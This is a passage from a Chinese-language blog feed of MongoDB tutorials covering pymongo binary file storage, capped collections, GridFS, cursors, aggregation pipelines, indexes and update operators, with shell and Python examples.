class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#将文件以二进制存储到数据库</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pymongo <span class="keyword">import</span> MongoClient</span><br><span class="line"><span class="keyword">import</span> bson.binary</span><br><span class="line"></span><br><span class="line">conn=MongoClient(<span class="string">'localhost'</span>,<span class="number">27017</span>)</span><br><span class="line">db=conn.file</span><br><span class="line">my_set=db.img</span><br><span class="line"></span><br><span class="line"><span class="comment">#存储</span></span><br><span class="line">f=open(<span class="string">'img.jpg'</span>,<span class="string">'rb'</span>)</span><br><span class="line"><span class="comment">#将读取的二进制流变为bson格式二进制字串</span></span><br><span class="line"></span><br><span class="line">content=bson.binary.Binary(f.read())</span><br><span class="line"></span><br><span class="line">my_set.insert(&#123;<span class="string">'filename'</span>:<span class="string">'img.jpg'</span>,<span class="string">'date'</span>:content&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#提取文件</span></span><br><span class="line">data=my_set.find_one(&#123;<span class="string">'filename'</span>:<span class="string">'img.jpg'</span>&#125;)</span><br><span class="line"><span class="keyword">with</span> open(data[<span class="string">'filename'</span>],<span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">f.write(data[<span class="string">'data'</span>])</span><br><span class="line">conn.close()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;Python操作MongoDB需要安装pymongo库&quot;&gt;&lt;a href=&quot;#Python操作MongoDB需要安装pymongo库&quot; class=&quot;headerlink&quot; title=&quot;Python操作MongoDB需要安装pymongo库&quot;&gt;&lt;/a&gt;&lt;stro
      
    
    </summary>
    
    
      <category term="DBMS" scheme="http://c.cat.plus/categories/DBMS/"/>
    
      <category term="MongoDB" scheme="http://c.cat.plus/categories/DBMS/MongoDB/"/>
    
      <category term="Python" scheme="http://c.cat.plus/categories/Python/"/>
    
    
      <category term="python" scheme="http://c.cat.plus/tags/python/"/>
    
      <category term="mongodb" scheme="http://c.cat.plus/tags/mongodb/"/>
    
  </entry>
  
  <entry>
    <title>MongoDB固定集合和文件存储</title>
    <link href="http://c.cat.plus/2018/03/18/MongoDB/MongoDB%E5%9B%BA%E5%AE%9A%E9%9B%86%E5%90%88%E5%92%8C%E6%96%87%E4%BB%B6%E5%AD%98%E5%82%A8/"/>
    <id>http://c.cat.plus/2018/03/18/MongoDB/MongoDB%E5%9B%BA%E5%AE%9A%E9%9B%86%E5%90%88%E5%92%8C%E6%96%87%E4%BB%B6%E5%AD%98%E5%82%A8/</id>
    <published>2018-03-17T20:23:29.000Z</published>
    <updated>2020-07-21T11:03:01.150Z</updated>
    
    <content type="html"><![CDATA[<h4 id="固定集合"><a href="#固定集合" class="headerlink" title="固定集合"></a><strong>固定集合</strong></h4><ul><li><p>mongo中可以创建大小固定的集合,称之为固定集合,固定集合的性能出色,适用于很多场景</p></li><li><p>比如: 日志处理, 临时缓存</p></li><li><p>特点: </p><ul><li>插入速度快</li><li>顺序查询速度快</li><li>能够淘汰早期数据</li><li>可以控制集合空间</li></ul></li><li><p>创建: </p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db.createCollection(collectionName,&#123;capped:true,size:10000,max:1000&#125;)</span><br></pre></td></tr></table></figure><ul><li>size: 设置固定集合的大小,单位 <code>Kb</code></li><li>max: 最多能容纳多少文档<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">e.g.创建一个最多包含三条文档的集合</span><br><span class="line">db.createCollection(&#39;log&#39;,&#123;capped:true,size:10,max:3&#125;)</span><br><span class="line">db.log.insert(&#123;&#39;host&#39;:&#39;1.1.1.1&#39;&#125;)</span><br><span class="line">db.log.insert(&#123;&#39;host&#39;:&#39;1.1.1.2&#39;&#125;)</span><br><span class="line">db.log.insert(&#123;&#39;host&#39;:&#39;1.1.1.3&#39;&#125;)</span><br><span class="line">#当插入第4条自动把第一条删除</span><br></pre></td></tr></table></figure></li></ul></li></ul><h4 id="文件存储"><a href="#文件存储" class="headerlink" title="文件存储"></a><strong>文件存储</strong></h4><ul><li><p>数据库存储文件的方式</p><ol><li><p>在数据库中以字符串的方式存储文件在本地的路径</p><ul><li>优点: 节省数据库空间</li><li>缺点: 当数据库或者文件位置发生变化即需要相应修改数据库内容</li></ul></li><li><p>将文件以二进制数据的方式存放在数据库里</p><ul><li>优点: 文件存入数据库,数据库在,即文件不会丢失</li><li>缺点: 当文件较大时,数据库空间占用大,提取困难</li></ul></li></ol></li><li><p>mongo中使用 <strong>GridFS</strong>方案 进行大文件存储</p></li><li><p>GridFS: 是mongodb中大文件存储的一种方案,mongo中认为大于16M的文件为大文件</p></li><li><p>方案解释:</p><ul><li>在mongodb中,创建两个集合,共同完成对文件的存储</li><li>fs.files: cunc文件的相关信息,比如: 文件名,文件类型</li><li>fs.chunks: 实际存储文件内容,以二进制方式分块存储,将大文件分为多个小块,每块占一个空间 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mongofiles -d DBName put xxx.zip</span><br><span class="line"> 数据库名 要存储的文件</span><br></pre></td></tr></table></figure></li><li>如果数据库不存在则自动创建<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mongofiles -d code put hellopython.py</span><br><span class="line">mongo</span><br><span class="line">use code</span><br><span class="line">db.fs.files.find(&#123;&#125;,&#123;_id:0&#125;)</span><br><span class="line">db.fs.chunks.find(&#123;&#125;,&#123;_id:0&#125;)</span><br></pre></td></tr></table></figure></li><li>获取数据库中文件<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mongofiles -d grid get hellopython.py</span><br></pre></td></tr></table></figure></li><li>优点: 存储方便,方便数据库移植,对文件个数没有太多限制</li><li>缺点: 读写效率低</li></ul></li></ul><h4 id="游标"><a href="#游标" class="headerlink" title="游标"></a><strong>游标</strong></h4><ul><li>为什么使用游标<ol><li>防止网络拥塞,造成数据传输慢</li><li>提高用户解析体验,可以后端解析<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var cursor &#x3D; db.class0.find()#创建游标</span><br><span class="line">cursor.hasNext()#查看是否有下一个数据</span><br><span class="line">cursor.next()#获取下一个数据</span><br></pre></td></tr></table></figure></li></ol></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;固定集合&quot;&gt;&lt;a href=&quot;#固定集合&quot; class=&quot;headerlink&quot; title=&quot;固定集合&quot;&gt;&lt;/a&gt;&lt;strong&gt;固定集合&lt;/strong&gt;&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;mongo中可以创建大小固定的集合,称之为固定集合,固定集合的性能出色,
      
    
    </summary>
    
    
      <category term="DBMS" scheme="http://c.cat.plus/categories/DBMS/"/>
    
      <category term="MongoDB" scheme="http://c.cat.plus/categories/DBMS/MongoDB/"/>
    
    
      <category term="mongodb" scheme="http://c.cat.plus/tags/mongodb/"/>
    
      <category term="游标" scheme="http://c.cat.plus/tags/%E6%B8%B8%E6%A0%87/"/>
    
  </entry>
  
  <entry>
    <title>MongoDB聚合</title>
    <link href="http://c.cat.plus/2018/03/17/MongoDB/MongoDB%E8%81%9A%E5%90%88/"/>
    <id>http://c.cat.plus/2018/03/17/MongoDB/MongoDB%E8%81%9A%E5%90%88/</id>
    <published>2018-03-16T22:13:19.000Z</published>
    <updated>2020-07-20T12:48:49.158Z</updated>
    
    <content type="html"><![CDATA[<h4 id="聚合"><a href="#聚合" class="headerlink" title="聚合"></a><strong>聚合</strong></h4><ul><li><p>对数据文档进行整理统计</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db.collectionName.aggregate()</span><br></pre></td></tr></table></figure></li><li><p>功能: 聚合函数,配合聚合条件进行数据整理统计</p></li><li><p>参数: 聚合条件</p></li><li><p><strong>分组操作符</strong></p></li></ul><p><strong>$group</strong> 分组 和分组操作符配合使用确定按什么分组</p><ul><li><strong>分组操作符</strong> (和$group配合)</li></ul><p><strong>$sum</strong> 求和</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">e.g.统计每组个数</span><br><span class="line">db.class0.aggregate(&#123;$group:&#123;_id:&#39;$gender&#39;,num:&#123;$sum:1&#125;&#125;&#125;)</span><br><span class="line">聚合分组按gender分组num为统计结果名</span><br><span class="line"></span><br><span class="line">e.g.统计每组年龄和</span><br><span class="line">db.class0.aggregate(&#123;$group:&#123;_id:&#39;$gender&#39;,num:&#123;$sum:&#39;$age&#39;&#125;&#125;&#125;)</span><br></pre></td></tr></table></figure><p><strong>$avg</strong> 求平均数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">e.g.求平均年龄</span><br><span class="line">db.class0.aggregate(&#123;$group:&#123;_id:&#39;$gender&#39;,num:&#123;$avg:&#39;$age&#39;&#125;&#125;&#125;)</span><br></pre></td></tr></table></figure><p><strong>$min</strong> 求最小值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">e.g.求每组姓名的最小值</span><br><span class="line">db.class0.aggregate(&#123;$group:&#123;_id:&#39;$gender&#39;,name:&#123;$min:&#39;$name&#39;&#125;&#125;&#125;)</span><br></pre></td></tr></table></figure><p><strong>$max</strong> 求最大值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">e.g.求每组姓名的最大值</span><br><span class="line">db.class0.aggregate(&#123;$group:&#123;_id:&#39;$gender&#39;,name:&#123;$max:&#39;$name&#39;&#125;&#125;&#125;)</span><br></pre></td></tr></table></figure><p><strong>$first</strong>    返回每组第一个文档指定域值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db.class0.aggregate(&#123;$group:&#123;_id:&#39;$gender&#39;,name:&#123;$first:&#39;$name&#39;&#125;&#125;&#125;)</span><br></pre></td></tr></table></figure><p><strong>$last</strong> 返回每组最后一个文档指定域值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db.class0.aggregate(&#123;$group:&#123;_id:&#39;$gender&#39;,name:&#123;$last:&#39;$name&#39;&#125;&#125;&#125;)</span><br></pre></td></tr></table></figure><ul><li><p><strong>$project</strong></p></li><li><p>用于修饰文档的显示结构</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">db.class0.aggregate(&#123;$project:&#123;_id:0,name:1,age:1&#125;&#125;)</span><br><span class="line">db.class0.aggregate(&#123;$project:&#123;_id:0,Name:&#39;$name&#39;,Age:&#39;$age&#39;&#125;&#125;)</span><br></pre></td></tr></table></figure></li><li><p><strong>$match</strong> 过滤数据</p></li><li><p>操作符的值同find的query</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db.class0.aggregate(&#123;$match:&#123;name:&#123;$gt:&#39;Tom&#39;&#125;&#125;&#125;)</span><br></pre></td></tr></table></figure></li><li><p><strong>$skip</strong> 跳过前几条文档</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db.class0.aggregate(&#123;$skip:2&#125;)</span><br></pre></td></tr></table></figure></li><li><p><strong>$limit</strong> 限制显示几条文档</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db.class0.aggregate(&#123;$limit:2&#125;)</span><br></pre></td></tr></table></figure></li><li><p><strong>$sort</strong> 排序</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db.class0.aggregate(&#123;$sort:&#123;name:1&#125;&#125;)</span><br></pre></td></tr></table></figure></li></ul><h4 id="聚合管道"><a href="#聚合管道" class="headerlink" title="聚合管道"></a><strong>聚合管道</strong></h4><ul><li>将前一个聚合操作的结果给下一个聚合操作继续执行<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">db.collectionName.aggregate([聚合1,聚合2,...])</span><br><span class="line">db.class0.aggregate([&#123;$match:&#123;name:&#123;$gt:&#39;Tom&#39;&#125;&#125;&#125;,&#123;$project:&#123;_id:0,name:1,age:1&#125;&#125;,&#123;$sort:&#123;name:-1&#125;&#125;])</span><br><span class="line">db.class0.aggregate([&#123;$group:&#123;_id:&#39;$gender&#39;,num:&#123;$sum:1&#125;&#125;&#125;,&#123;$match:&#123;$nor:[&#123;_id:&#39;m&#39;&#125;,&#123;_id:&#39;w&#39;&#125;]&#125;&#125;])</span><br></pre></td></tr></table></figure></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;聚合&quot;&gt;&lt;a href=&quot;#聚合&quot; class=&quot;headerlink&quot; title=&quot;聚合&quot;&gt;&lt;/a&gt;&lt;strong&gt;聚合&lt;/strong&gt;&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;对数据文档进行整理统计&lt;/p&gt;
&lt;figure class=&quot;highlight pla
      
    
    </summary>
    
    
      <category term="DBMS" scheme="http://c.cat.plus/categories/DBMS/"/>
    
      <category term="MongoDB" scheme="http://c.cat.plus/categories/DBMS/MongoDB/"/>
    
    
      <category term="mongodb" scheme="http://c.cat.plus/tags/mongodb/"/>
    
      <category term="聚合" scheme="http://c.cat.plus/tags/%E8%81%9A%E5%90%88/"/>
    
  </entry>
  
  <entry>
    <title>MongoDB索引</title>
    <link href="http://c.cat.plus/2018/03/16/MongoDB/MongoDB%E7%B4%A2%E5%BC%95/"/>
    <id>http://c.cat.plus/2018/03/16/MongoDB/MongoDB%E7%B4%A2%E5%BC%95/</id>
    <published>2018-03-15T22:13:19.000Z</published>
    <updated>2020-07-23T16:04:07.483Z</updated>
    
    <content type="html"><![CDATA[<h4 id="索引"><a href="#索引" class="headerlink" title="索引"></a><strong>索引</strong></h4><ul><li>索引指的是建立指定键值及所在文档中存储位置的对照清单,使用索引以方便我们进行快速查找,减少遍历次数,提高查找效率</li></ul><p><strong>mongo中如何创建索引</strong></p><ul><li><code>ensureIndex()</code></li><li>功能: 创建索引</li><li>参数: 索引类别,索引选项  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">e.g.</span><br><span class="line">db.class0.ensureIndex(&#123;&#39;name&#39;:1&#125;)</span><br></pre></td></tr></table></figure></li><li>1表示为该域创建正向索引,-1表示逆向索引</li><li><code>_id</code> 域会自动创建索引</li></ul><p><strong>查看一个集合中的索引</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db.class0.getIndexes()</span><br></pre></td></tr></table></figure><p><strong>删除索引</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dropIndex()</span><br></pre></td></tr></table></figure><ul><li>功能: 删除索引</li><li>参数: 删除索引的名称  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">e.g.可以通过索引名称或者索引键值对删除</span><br><span class="line">db.class0.dropIndex(&#39;name-1&#39;)</span><br><span class="line">db.class0.dropIndex(&#123;name:1&#125;)</span><br></pre></td></tr></table></figure></li><li>删除所有索引  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db.class0.dropIndexes()</span><br></pre></td></tr></table></figure></li></ul><h4 id="索引类型"><a href="#索引类型" class="headerlink" title="索引类型"></a><strong>索引类型</strong></h4><ul><li><p><strong>复合索引</strong></p><ul><li>根据多个域创建一个索引<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db.class0.ensureIndex(&#123;name:1,age:-1&#125;)</span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong>数组索引</strong></p><ul><li>如果对某个数组域创建索引,那么表示对数组中的每个值均创建了索引,通过数组中单个值查询,也是索引查询<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db.class1.ensureIndex(&#39;score&#39;:1)</span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong>子文档索引</strong></p><ul><li>如果对一个域创建索引,值是一个文档则子文档也会同时形成索引</li><li>如果对子文档某一个域进行索引创建,则通过子文档中的该域查找时为索引查找<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">db.class2.ensureIndex(&#123;&#39;publication&#39;:1&#125;)</span><br><span class="line">db.class2.ensureIndex(&#123;&#39;publication.pulisher&#39;:1&#125;)</span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong>覆盖索引</strong></p><ul><li>查找时只获取索引项的内容,而不必去获取原数据中的其它内容,这样就不去连接原来的数据直接返回即可<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">e.g.name为索引项,显示也只要name域</span><br><span class="line">db.class0.find(&#123;name:&#39;Lily&#39;&#125;,&#123;_id:0,name:1&#125;)</span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong>唯一索引</strong></p><ul><li>创建索引时希望索引域的值均不相同,也可以据此限制一个域的值<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">e.g.</span><br><span class="line">db.class0.ensureIndex(&#123;age:1&#125;,&#123;&#39;unique&#39;:true&#125;)</span><br></pre></td></tr></table></figure></li><li>当对某个域创建了唯一索引后,即不允许再插入相同值的文档</li></ul></li><li><p><strong>稀疏索引</strong> (间隙索引)</p><ul><li>只针对有指定域的文档创建索引表,没有该域的文档,不会插入到索引表中<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db.class2.ensureIndex(&#123;&#39;date&#39;:1&#125;,&#123;sparse:true&#125;)</span><br></pre></td></tr></table></figure></li></ul></li></ul><h4 id="索引约束"><a href="#索引约束" class="headerlink" title="索引约束"></a><strong>索引约束</strong></h4><ul><li>影响数据的插入,删除,修改操作,当数据发生改变时,索引表必须同步更新</li><li>索引也是需要占用一定的空间资源</li><li>当数据库大量操作是插入,修改,删除操作,而非查询操作时,不适合创建索引,数据量比较小时,考虑到空间成本也不适合创建索引,即使适合创建索引的情况,也不是索引越多越好</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;索引&quot;&gt;&lt;a href=&quot;#索引&quot; class=&quot;headerlink&quot; title=&quot;索引&quot;&gt;&lt;/a&gt;&lt;strong&gt;索引&lt;/strong&gt;&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;索引指的是建立指定键值及所在文档中存储位置的对照清单,使用索引以方便我们进行快速查找,减少遍历
      
    
    </summary>
    
    
      <category term="DBMS" scheme="http://c.cat.plus/categories/DBMS/"/>
    
      <category term="MongoDB" scheme="http://c.cat.plus/categories/DBMS/MongoDB/"/>
    
    
      <category term="mongodb" scheme="http://c.cat.plus/tags/mongodb/"/>
    
      <category term="索引" scheme="http://c.cat.plus/tags/%E7%B4%A2%E5%BC%95/"/>
    
  </entry>
  
  <entry>
    <title>MongoDB修改数据</title>
    <link href="http://c.cat.plus/2018/03/15/MongoDB/MongoDB%E4%BF%AE%E6%94%B9%E6%95%B0%E6%8D%AE/"/>
    <id>http://c.cat.plus/2018/03/15/MongoDB/MongoDB%E4%BF%AE%E6%94%B9%E6%95%B0%E6%8D%AE/</id>
    <published>2018-03-14T22:13:19.000Z</published>
    <updated>2020-07-23T16:04:54.947Z</updated>
    
    <content type="html"><![CDATA[<h4 id="MySQL和MongoDB修改数据语句对比"><a href="#MySQL和MongoDB修改数据语句对比" class="headerlink" title="MySQL和MongoDB修改数据语句对比"></a><strong>MySQL和MongoDB修改数据语句对比</strong></h4><ul><li>MySQL:  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">update tableName set ... where ...</span><br></pre></td></tr></table></figure></li><li>MongoDB:  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db.collectionName.update(query,update,upsert,multi)</span><br></pre></td></tr></table></figure></li><li>功能: 修改一个文档    </li><li>参数: <ul><li><code>query</code> : 筛选要修改的文档,相当于where子句,用法同查找</li><li><code>update</code>: 将数据更新为别的内容,相当于set操作,需要使用修改器操作符</li><li><code>upsert</code>: bool值,默认为false,表示如果query的文档不存在则无法修改,如果设置为true,表示如果query的文档不存在则根据query和update参数插入新的文档</li><li><code>multi</code> : bool值,默认为false,如果有多条符合筛选条件的文档则只修改第一条,如果设置为true,则修改所有符合条件的文档<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">e.g.将Lily年龄改为24</span><br><span class="line">db.class0.update(&#123;name:&#39;Lily&#39;&#125;,&#123;$set:&#123;age:24&#125;&#125;)</span><br><span class="line"></span><br><span class="line">e.g.如果被修改的数据不存在,则插入一条新的数据</span><br><span class="line">db.class0.update(&#123;name:&#39;Jerry&#39;&#125;,&#123;$set:&#123;age:18,sex:&#39;m&#39;&#125;&#125;,true)</span><br><span class="line"></span><br><span class="line">e.g.筛选年龄大于20的,修改为18,默认修改第一条</span><br><span class="line">db.class0.update(&#123;age:&#123;$gt:20&#125;&#125;,&#123;$set:&#123;age:18&#125;&#125;)</span><br><span class="line"></span><br><span class="line">e.g.筛选性别为女,修改年龄全部为20,第4个multi参数设置为true可同时修改多条</span><br><span class="line">db.class0.update(&#123;sex:&#39;w&#39;&#125;,&#123;$set:&#123;age:20&#125;&#125;,false,true)</span><br></pre></td></tr></table></figure></li></ul></li></ul><h4 id="修改器操作符"><a href="#修改器操作符" class="headerlink" title="修改器操作符"></a><strong>修改器操作符</strong></h4><p><strong>$set</strong></p><ul><li>修改一个域的值</li><li>增加一个域  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">e.g.增加sex域</span><br><span class="line">db.class0.update(&#123;name:&#39;Tom&#39;&#125;,&#123;$set:&#123;sex:&#39;m&#39;&#125;&#125;)</span><br></pre></td></tr></table></figure></li></ul><p><strong>$unset</strong></p><ul><li>删除一个域  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">e.g.删除文档的sex和age域(后面的数字习惯写1或0都表示删除)</span><br><span class="line">db.class0.update(&#123;name:&#39;Tom&#39;&#125;,&#123;$unset:&#123;sex:0,age:0&#125;&#125;)</span><br></pre></td></tr></table></figure></li></ul><p><strong>$rename</strong></p><ul><li>修改域名称  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">e.g.修改所有sex域为gender域</span><br><span class="line">db.class0.update(&#123;&#125;,&#123;$rename:&#123;sex:&#39;gender&#39;&#125;&#125;,false,true)</span><br></pre></td></tr></table></figure></li></ul><p><strong>$setOnInsert</strong></p><ul><li>如果update操作插入新的文档,则补充插入内容</li><li>配合$set使用,修改器可以同时使用多个  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">e.g.如果插入数据则同时插入sex和tel域内容</span><br><span class="line">db.class0.update(&#123;name:&#39;amy&#39;&#125;,&#123;$set:&#123;age:21&#125;,$setOnInsert:&#123;sex:&#39;w&#39;,tel:&#39;123456&#39;&#125;&#125;,true)</span><br></pre></td></tr></table></figure></li></ul><p><strong>$inc</strong></p><ul><li>数字加减修改器</li><li>正数,负数,小数都可以  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">e.g.查询所有年龄小于18的,加1</span><br><span class="line">db.class0.update(&#123;age:&#123;$lt:18&#125;&#125;,&#123;$inc:&#123;age:1&#125;&#125;,false,true)</span><br><span class="line">e.g.查询所有年龄小于18的,减2</span><br><span class="line">db.class0.update(&#123;age:&#123;$lt:18&#125;&#125;,&#123;$inc:&#123;age:-2&#125;&#125;,false,true)</span><br></pre></td></tr></table></figure></li></ul><p><strong>$mul</strong></p><ul><li>乘法修改器</li><li>正数,负数,小数都可以  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">e.g.查询所有年龄小于18的,乘以2</span><br><span class="line">db.class0.update(&#123;age:&#123;$lt:18&#125;&#125;,&#123;$mul:&#123;age:2&#125;&#125;,false,true)</span><br></pre></td></tr></table></figure></li></ul><p><strong>$min</strong></p><ul><li>设定最小值: 如果筛选的文档指定的域值小于min值则不变,如果大于min值则改为min值  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db.class0.update(&#123;&#125;,&#123;$min:&#123;age:18&#125;&#125;,false,true)</span><br></pre></td></tr></table></figure></li></ul><p><strong>$max</strong></p><ul><li>设定最大值: 如果筛选的文档指定域值大于max值则不变,如果小于max值则修改为max值  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db.class0.update(&#123;&#125;,&#123;$max:&#123;age:20&#125;&#125;,false,true)</span><br></pre></td></tr></table></figure></li></ul><h5 id="数组修改器"><a href="#数组修改器" class="headerlink" title="数组修改器"></a><strong>数组修改器</strong></h5><p><strong>$push</strong></p><ul><li>向数组中添加一项  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db.class1.update(&#123;name:&quot;Abby&quot;&#125;,&#123;$push:&#123;score:30&#125;&#125;)</span><br></pre></td></tr></table></figure></li></ul><p><strong>$pushAll</strong></p><ul><li>向数组中添加多项  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db.class1.update(&#123;name:&quot;Abby&quot;&#125;,&#123;$pushAll:&#123;score:[11,20]&#125;&#125;)</span><br></pre></td></tr></table></figure></li></ul><p><strong>$each</strong></p><ul><li>逐个操作  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">e.g.利用each添加多项</span><br><span class="line">db.class1.update(&#123;name:&quot;Abby&quot;&#125;,&#123;$push:&#123;score:&#123;$each:[10,5]&#125;&#125;&#125;)</span><br></pre></td></tr></table></figure></li></ul><p><strong>$position</strong></p><ul><li><p>选择数据位置进行操作,必须和each合用</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">e.g.从位置1开始添加each两项</span><br><span class="line">db.class1.update(&#123;name:&quot;Lucy&quot;&#125;,&#123;$push:&#123;score:&#123;$each:[10,10],$position:1&#125;&#125;&#125;)</span><br></pre></td></tr></table></figure></li></ul><p><strong>$sort</strong></p><ul><li>对数组进行排序,必须和each合用  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">e.g.1表示升序,-1降序,each必须有,为空则不添加</span><br><span class="line">db.class1.update(&#123;name:&quot;Lucy&quot;&#125;,&#123;$push:&#123;score:&#123;$each:[],$sort:1&#125;&#125;&#125;)</span><br></pre></td></tr></table></figure></li></ul><p><strong>$pull</strong></p><ul><li><p>从数组中删除一个元素</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">e.g.从Lucy的score数组中删除10</span><br><span 